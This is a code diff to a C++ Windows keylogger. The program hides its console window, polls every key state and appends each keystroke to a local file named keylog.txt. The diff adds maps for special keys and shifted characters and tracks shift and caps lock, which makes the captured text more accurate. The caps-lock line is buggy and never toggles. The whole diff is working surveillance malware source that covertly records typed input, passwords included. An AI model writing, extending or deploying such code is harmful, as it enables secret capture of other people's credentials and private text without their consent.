@@ -4,23 +4,55 @@
 #include <cctype>
 #include <map>
 
-std::map<int, std::string> myMap = {
-    {1, "#LCK#"},
-    {2, "#RCK#"},
-    {9, "#TAB#"},
-    {13, "#ENT#"},
-    {16, " "},
-    {20, "#CPL#"},
-    {32, "#SPC#"},
-    {33, "#PUP#"},
-    {34, "#PDN#"},
-    {37, "#LFA#"},
-    {38, "#DNA#"},
-    {39, "#RTA#"},
-    {40, "#UPA#"},
-    {91, "#WIN#"},
-    {255, "#FNC#"},
+
+std::map<int, std::string> spcl_key_map = {
+    {1, "#LCK#"}, // left click
+    {2, "#RCK#"}, // right click
+    {9, "#TAB#"}, // tab
+    {13, "#ENT#"}, // enter
+    {16, "#SHF#"}, // shift
+    {17, "#CTR#"}, // CTRL
+    {18, "#ALT#"}, // Alt
+    {20, "#CPL#"}, // caps lock
+    {32, " "}, // space
+    {33, "#PUP#"}, // page up
+    {34, "#PDN#"}, // page down
+    {37, "#LFA#"}, // left arrow
+    {38, "#DNA#"}, // down arrow
+    {39, "#RTA#"}, // right arrow
+    {40, "#UPA#"}, // up arrow
+    {44, "#---#"}, // Funny Key
+    {91, "#WIN#"}, // windows key
+    {255, "#FNC#"}, // Fn
 };
+
+std::map<char, std::string> shft_key_map = {
+    {'1', "!"},  
+    {'2', "@"}, 
+    {'3', "#"}, 
+    {'4', "$"}, 
+    {'5', "%"}, 
+    {'6', "^"}, 
+    {'7', "&"}, 
+    {'8', "*"}, 
+    {'9', "("}, 
+    {'0', ")"}, 
+    {'-', "_"},
+    {'=', "+"},
+    {'[', "{"},
+    {']', "}"},
+    {'\\', "|"},
+    {';', ":"},
+    {'\'', "\""},
+    {',', "<"},
+    {'.', ">"},
+    {'/', "?"},
+    
+};
+
+bool caps_lock = false;
+bool shft_key = false;
+
 
 void hideConsole(){
     // get the console window handle
@@ -37,8 +69,6 @@ int main(){
     bool key_state[256] = {true}; // array to track key states
     char key_char = ' ';
     
-    
-
     hideConsole();
 
     std::ofstream keylog("keylog.txt", std::ios::app); // open or create a text file in append mode
@@ -56,15 +86,39 @@ int main(){
 
             // check if key pressed
             if (GetAsyncKeyState(vkey) & 0x8000) {
-                
+                if (vkey == 16){ shft_key = true; }
+
                 if (key_state[vkey]) {
                     continue; // skip this key if already pressed
                 }
+
+                if(spcl_key_map[vkey] != ""){ // handles special keys
+
+                    if(vkey == 20) { caps_lock = (true) ? true : false; } // switch for caps lock key
+
+                    keylog << spcl_key_map[vkey];
+                    keylog.flush();
+                    std::cout << spcl_key_map[vkey] << std::endl;
+                    key_state[vkey] = true;
+                    continue;
+                }
+
                 std::cout << vkey;
                 key_char = MapVirtualKey(vkey, MAPVK_VK_TO_CHAR);
                 
-                if (!key_state[VK_SHIFT]) { keylog << (char) tolower(key_char); std::cout << (char) tolower(key_char);}
-                else{ keylog << key_char; std::cout << key_char;}
+                if (caps_lock || shft_key) { 
+
+                    if(shft_key_map[key_char] != ""){ // handles the shift value of a key
+                        keylog << shft_key_map[key_char];
+                        keylog.flush();
+                        std::cout << shft_key_map[key_char] << std::endl;
+                        key_state[vkey] = true;
+                        continue;
+                    }
+
+                    keylog << key_char; std::cout << key_char; // uppercase letters
+                }
+                else{ keylog << (char) tolower(key_char); std::cout << (char) tolower(key_char); } // lowercase letters
                 
                 keylog.flush(); // flush the output to the file
                 
@@ -76,6 +130,7 @@ int main(){
 
         // delay to avoid high CPU usage
         Sleep(10);
+        shft_key = false;
     } 
 
     keylog.close();
